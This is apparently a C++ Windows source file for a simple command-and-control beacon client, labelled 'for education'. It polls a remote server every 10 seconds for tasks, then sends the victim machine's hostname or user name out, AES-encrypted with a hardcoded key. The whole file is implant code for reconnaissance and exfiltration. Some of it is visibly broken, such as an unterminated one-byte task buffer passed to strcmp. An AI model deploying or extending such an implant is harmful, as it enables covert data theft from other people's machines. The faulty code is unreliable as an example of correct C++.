#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <winsock2.h>
#include <bcrypt.h>
#include <vector>
#include <fstream>
#include <string>

using namespace std;
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Bcrypt.lib")


//ШИФРОВАНИЕ
void encryption(char* data, const char* key, char *iv, vector<unsigned char> &encryptedtext)
{
	UCHAR iv_enc[16];

	BCRYPT_ALG_HANDLE hAlg = NULL;
	if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))
	{
		cout << "чтото нето" << endl;
		return;
	}

	BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

	BCRYPT_KEY_HANDLE hKey = NULL;
	DWORD cbKeyObject = 0, cbData = 0;
	BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(cbKeyObject), &cbData, 0);
	vector<UCHAR> keyObject(cbKeyObject);

	BCryptGenerateSymmetricKey(
		hAlg, &hKey,
		keyObject.data(), cbKeyObject,
		(PUCHAR)key, (ULONG)strlen(key),
		0
	);

	BCryptGenRandom(NULL, (PUCHAR)iv, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	memcpy(iv_enc, iv, 16);

	ULONG cbCipherText = 0;

	BCryptEncrypt(
		hKey,
		(PUCHAR)data,
		strlen(data),
		NULL,
		(PUCHAR)iv_enc,
		16,
		NULL,             
		0,                 
		&cbCipherText,    
		BCRYPT_BLOCK_PADDING
	);

	encryptedtext.resize(cbCipherText);

	BCryptEncrypt(
		hKey,
		(PUCHAR)data,
		strlen(data),
		NULL,
		(PUCHAR)iv_enc,
		16,
		encryptedtext.data(),
		cbCipherText,
		&cbCipherText,
		BCRYPT_BLOCK_PADDING
	);

	//cout << "CiphertextHEX: ";
	//for (auto b : encryptedtext)
	//	printf("%02X", b);
	//cout << endl;

	BCryptDestroyKey(hKey);
	BCryptCloseAlgorithmProvider(hAlg, 0);
}
//ШИФРОВАНИЕ



//ИНФОРМАЦИЯ О СИСТЕМЕ
void gethostnameinfo(char* hostname, int length)
{
	gethostname(hostname, length);
}

void getusernameinfo(char* username, DWORD size)
{
	GetUserNameA(username, &size);
}
//ИНФОРМАЦИЯ О СИСТЕМЕ



string read_ip_from_file(const string& filename)
{
	ifstream file(filename);
	if (!file.is_open())
	{
		std::cerr << "Failed to open config file\n";
		return "";
	}

	string ip;
	getline(file, ip);
	return ip;
}


int main()
{
	//МЕНЮ
	string connectionip;
	cout << "Custom C2 channel for education" << endl << endl;
	cout << "Please choose network mode: " << endl;
	cout << "1 - Localhost (127.0.0.1)" << endl;
	cout << "2 - Remote server" << endl;
	cout << "3 - Remote server (config.txt)" << endl << endl;
	while (true)
	{
		cout << "Enter your choice: ";
		char choice;
		cin >> choice;
		if (choice == '1')
		{
			cout << "Localhost mode selected" << endl << endl;
			connectionip = "127.0.0.1";
			break;
		}
		else if (choice == '2')
		{
			cout << "Remote server mode selected. Write your remote ip address: ";
			cin >> connectionip;
			cout << "Ip address: " << connectionip << endl << endl;
			break;
		}
		else if (choice == '3')
		{
			connectionip = read_ip_from_file("config.txt");
			if (connectionip.empty())
			{
				cerr << "IP not found\n";
			}
			else
			{
				cout << "Remote server mode selected. Ip address: " << connectionip << endl;
				break;
			}
		}
		else
		{
			cout << "Invalid choice. Try again." << endl;
		}
	}
	//МЕНЮ



	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

	//TCP КЛИЕНТ
	while (1)
	{
		char iv[16] = { 0 };
		vector<unsigned char> packet;
		vector<unsigned char> encryptedtext;
		const char* key = "fdsdabuiifjvjdufjvfsrwqokvcxufew";

		SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == INVALID_SOCKET)
		{
			cout << "socket error" << endl;
			return 1;
		}
		sockaddr_in server;
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = inet_addr(connectionip.c_str());
		server.sin_port = htons(27015);

		int iResult = connect(s, (SOCKADDR*)&server, sizeof(server));
		if (iResult == SOCKET_ERROR)
		{
			wprintf(L"connect function failed with error: %ld\n", WSAGetLastError());
			iResult = closesocket(s);
			if (iResult == SOCKET_ERROR)
				wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
		}
		else
		{
			wprintf(L"Successfully connected to server.\n");
			const char* msg = "get_task";
			char  task[1];
			send(s, msg, strlen(msg), 0);
			recv(s, task, 1, 0);
			cout << "Received from server: " << task << endl << endl;
			if (strcmp(task, "1") == 0)
			{
				char hostname[256];
				gethostnameinfo(hostname, sizeof(hostname));
				encryption(hostname, key, iv, encryptedtext);
				packet.insert(packet.end(), iv, iv + 16);
				packet.insert(packet.end(), encryptedtext.begin(), encryptedtext.end());
				send(s, (const char*)packet.data(), packet.size(), 0);
			}
			if (strcmp(task, "2") == 0)
			{
				char username[256];
				getusernameinfo(username, (DWORD)sizeof(username));
				encryption(username, key, iv, encryptedtext);
				packet.insert(packet.end(), iv, iv + 16);
				packet.insert(packet.end(), encryptedtext.begin(), encryptedtext.end());
				send(s, (const char*)packet.data(), packet.size(), 0);
			}
		}
		closesocket(s);
		Sleep(10000);
	}
	//TCP КЛИЕНТ

	WSACleanup();
}